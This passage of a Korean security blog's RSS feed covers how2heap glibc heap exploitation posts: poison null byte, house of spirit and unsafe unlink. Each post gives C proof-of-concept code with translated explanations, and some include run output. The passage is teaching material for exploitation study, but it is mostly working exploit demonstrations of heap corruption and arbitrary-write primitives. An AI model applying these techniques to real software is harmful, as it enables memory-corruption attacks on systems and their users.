class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"null byte 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'a'에 0x100 bytes 할당한다.\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'a'에 overflow가 발생하는 것을 원하기 때문에, 'a'의 '진짜' 크기를 알 필요가 있다. "</span></span><br><span class="line"><span class="string">"(반올림 때문에 0x100 이상이 될 수 있음): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">* the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">* the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"barrier를 %p에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.\n"</span></span><br><span class="line"><span class="string">"barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc의 새 버전에서 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.\n"</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'b'의 metadata에 있는 single null byte를 이용해서 'a'를 overflow한다.\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// exploit된 bug "</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 이 malloc은 b였던 chunk에서 unlink를 호출하는 결과일 것이다.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P)) 이후로 검사를 통과할 것이다.\n"</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'을 malloc한다. 그것은 'b'에 있던 곳에 위치할 것이다. "</span></span><br><span class="line"><span class="string">"이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'victim' chunk에 'b2'를 malloc한다.\n"</span>);</span><br><span class="line"><span class="comment">// 보통 b2(victim)는 우리가 조작할 수 있는 취약한 포인터를 가진 구조일 것이다.</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'과 c를 free한다: 'b1'과 'c'청크는 consolidate될 것이다.(b2를 잊어버리고)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"마지막으로, 'd'를 할당해서 'b2'를 overlapping한다.\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'d'와 'b2'가 overlap되었다.\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 b2 content:\n%s\n"</span>,b2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>null byte 2.0!</code><br><code>테스트 환경: Ubuntu 14.04 64bit.</code><br>이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.<br>이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.<br>'a’에 0x100 bytes 할당한다.<br><code>a: 0x603010</code><br>우리는 'a’에 overflow가 발생하는 것을 원하기 때문에, 'a’의 ‘진짜’ 크기를 알 필요가 있다. (반올림 때문에 0x100 이상이 될 수 있음): <code>0x108</code><br><code>b: 0x603120</code><br><code>c: 0x603330</code><br>barrier를 0x603440에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.<br>barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.<br>glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.<br><code>b.size: 0x211</code><br><code>b.size: (0x200 + 0x10) | prev_in_use</code><br>우리는 'b’의 metadata에 있는 single null byte를 이용해서 'a’를 overflow한다.<br><code>b.size: 0x200</code><br><code>c.prev_size: 0x210</code><br>우리는 chunksize§ == 0x200 == 0x200 == prev_size (next_chunk§) 이후로 검사를 통과할 것이다.<br><code>b1: 0x603120</code><br>이제 우리는 'b1’을 malloc한다. 그것은 'b’에 있던 곳에 위치할 것이다. 이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: <code>0x210</code><br>흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: f0<br>‘victim’ chunk에 'b2’를 malloc한다.<br><code>b2: 0x603230</code><br>현재 b2 content:<br><code>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</code><br>이제 우리는 'b1’과 c를 free한다: 'b1’과 'c’청크는 consolidate될 것이다.(b2를 잊어버리고)<br>마지막으로, 'd’를 할당해서 'b2’를 overlapping한다.<br><code>d: 0x603120</code><br>'d’와 'b2’가 overlap되었다.<br><code>바뀐 b2 contentcode></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] House_of_spirit</title>
      <link>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/</guid>
      <pubDate>Wed, 29 May 2019 07:05:24 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;house_of_spiritc&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="house_of_spiritc"><a class="markdownIt-Anchor" href="#house_of_spiritc"></a> House_of_spirit.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"house of spirit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 한 번 호출해서 메모리를 설정한다.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역(메모리 길이: %lu)은 chunk가 2개 있다. 첫번째는 %p에서 시작하고 두번째는 %p에서 시작한다.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"*next* fake 영역의 chunk 크기는 온전해야 한다. 그것은 &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (main arena는 기본적으로 &lt; 128kb)이 nextsize 무결성 체크를 통과한다.그래서 fastbin 크기가 필요 없다.\n"</span>);</span><br><span class="line"><span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overwrite된 포인터를 free한다.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"next malloc은 %p에 있는 fake chunk의 영역을 반환할 것이다. 그러면 %p이 될 것이다!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>house of spirit</code><br>malloc을 한 번 호출해서 메모리를 설정한다.<br>이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.<br>이 영역(메모리 길이: 80)은 chunk가 2개 있다. 첫번째는 <code>0x7fffffffe338</code>에서 시작하고 두번째는 <code>0x7fffffffe378</code>에서 시작한다.<br>이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.<br>이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, <code>0x7fffffffe338</code><br>overwrite된 포인터를 free한다.<br>-------free(a)-------<br>next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반환할 것이다. 그러면 <code>0x7fffffffe340</code>이 될 것이다!<br><code>malloc(0x30): 0x7fffffffe340</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] unsafe_unlink</title>
      <link>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/</guid>
      <pubDate>Wed, 29 May 2019 05:50:05 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;unsafe_unlinkc&quot;&gt;&lt;a class=&quot;markdow
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="unsafe_unlinkc"><a class="markdownIt-Anchor" href="#unsafe_unlinkc"></a> unsafe_unlink.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04/16.04 64bit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"global chunk0_ptr: %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"corrupt할 victim chunk: %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 fake chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\n"</span></span><br><span class="line"><span class="string">"그러나 이것은 새로운 값이다: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\n"</span></span><br><span class="line"><span class="string">"https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"원래 값: %s\n"</span>,victim_string);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------chunk0_ptr[0]=0x4141414142424242LL-------"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span 